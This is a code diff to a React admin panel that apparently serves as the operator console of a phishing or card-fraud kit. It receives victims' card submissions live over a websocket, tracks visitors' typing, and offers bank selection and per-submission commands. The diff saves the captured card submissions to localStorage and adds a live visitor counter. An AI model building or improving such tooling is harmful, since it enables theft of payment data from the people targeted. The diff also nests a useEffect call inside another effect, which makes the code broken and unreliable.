@@ -4,7 +4,7 @@ import { wsClient } from '@/integrations/ws-client';
 import TypingDetector from './TypingDetector';
 import EnhancedVisitorInfo from './EnhancedVisitorInfo';
 import AdminChat from './AdminChat';
-import LiveVisitorNotification from './LiveVisitorNotification';
+
 import BankSelectionModal from './BankSelectionModal';
 
 interface CardSubmission {
@@ -31,11 +31,15 @@ interface Visitor {
 }
 
 const AdminPanel = () => {
-  const [cardSubmissions, setCardSubmissions] = useState<CardSubmission[]>([]);
+  const [cardSubmissions, setCardSubmissions] = useState<CardSubmission[]>(() => {
+    const savedSubmissions = localStorage.getItem('card_submissions');
+    return savedSubmissions ? JSON.parse(savedSubmissions) : [];
+  });
   const [visitors, setVisitors] = useState<Visitor[]>([]);
   const [activeVisitors, setActiveVisitors] = useState<Visitor[]>([]);
   const [connectionStatus, setConnectionStatus] = useState<string>('Connected');
   const [notification, setNotification] = useState<string>('');
+  const [newVisitorGlow, setNewVisitorGlow] = useState<boolean>(false);
   const [showBankModal, setShowBankModal] = useState(false);
   const [selectedSubmissionId, setSelectedSubmissionId] = useState<string>('');
   const [adminCommands, setAdminCommands] = useState<{ [submissionId: string]: string[] }>({});
@@ -59,7 +63,10 @@ const AdminPanel = () => {
 
     const handleCardSubmission = (submission: CardSubmission) => {
       console.log('[AdminPanel] Received card_submission:', submission);
-      setCardSubmissions(prev => [{ ...submission, isNew: true, created_at: new Date().toISOString() }, ...prev]);
+      setCardSubmissions(prev => {
+        const updatedSubmissions = [{ ...submission, isNew: true, created_at: new Date().toISOString() }, ...prev];
+        return updatedSubmissions;
+      });
       showNotification('New card submission received');
     };
 
@@ -72,17 +79,26 @@ const AdminPanel = () => {
 
     const handleVisitorUpdate = (visitor: Visitor) => {
       console.log('[AdminPanel] Received visitor_update:', visitor);
-      // Ignore our own admin connection in visitor list
       const myId = wsClient.getSocketId();
       if (visitor.id === myId) return;
-      setActiveVisitors(prev => (prev.find(v => v.id === visitor.id) ? prev : [...prev, visitor]));
+      setActiveVisitors(prev => {
+        const updatedVisitors = prev.find(v => v.id === visitor.id) ? prev : [...prev, visitor];
+        setNewVisitorGlow(true); // Activate glow on new visitor
+        return updatedVisitors;
+      });
     };
 
     const handleVisitorLeft = (payload: { id: string }) => {
       console.log('[AdminPanel] Received visitor_left:', payload.id);
       const myId = wsClient.getSocketId();
       if (payload.id === myId) return;
-      setActiveVisitors(prev => prev.filter(v => v.id !== payload.id));
+      setActiveVisitors(prev => {
+        const updatedVisitors = prev.filter(v => v.id !== payload.id);
+        if (updatedVisitors.length === 0) {
+          setNewVisitorGlow(false); // Turn off glow if no visitors left
+        }
+        return updatedVisitors;
+      });
     };
 
     const handleDeleteAllTransactions = () => {
@@ -105,6 +121,11 @@ const AdminPanel = () => {
 
     // Register all event listeners
     wsClient.on('card_submission', handleCardSubmission);
+
+    // Save card submissions to localStorage whenever they change
+    useEffect(() => {
+      localStorage.setItem('card_submissions', JSON.stringify(cardSubmissions));
+    }, [cardSubmissions]);
 
     // If the socket is already connected (possible if connection event fired before listener registration),
     // immediately perform the connect handler logic to join the 'admins' room and request any queued data.
@@ -249,14 +270,20 @@ const AdminPanel = () => {
         </span>
       </div>
 
+      {/* Live Visitor Count */} 
+      <div className="fixed top-4 left-4 z-50">
+        <div className={`relative w-16 h-16 rounded-full flex items-center justify-center text-white font-bold text-xl transition-all duration-300 ${newVisitorGlow ? 'bg-blue-600 shadow-lg animate-pulse' : 'bg-gray-700'}`}>
+          {activeVisitors.length}
+          {activeVisitors.length === 1 ? ' Visitor' : ' Visitors'}
+        </div>
+      </div>
+
       {/* Notifications */}
       {notification && (
         <div className="fixed top-4 right-4 bg-blue-600 text-white px-4 py-2 rounded-lg shadow-lg">
           {notification}
         </div>
       )}
-      <LiveVisitorNotification visitors={activeVisitors} />
-      
       <BankSelectionModal
         isOpen={showBankModal}
         onClose={() => setShowBankModal(false)}
@@ -413,6 +440,7 @@ const AdminPanel = () => {
           <li>• Click the chat button to start live chat with users</li>
         </ul>
       </div>
+
       <AdminChat />
     </div>
   );
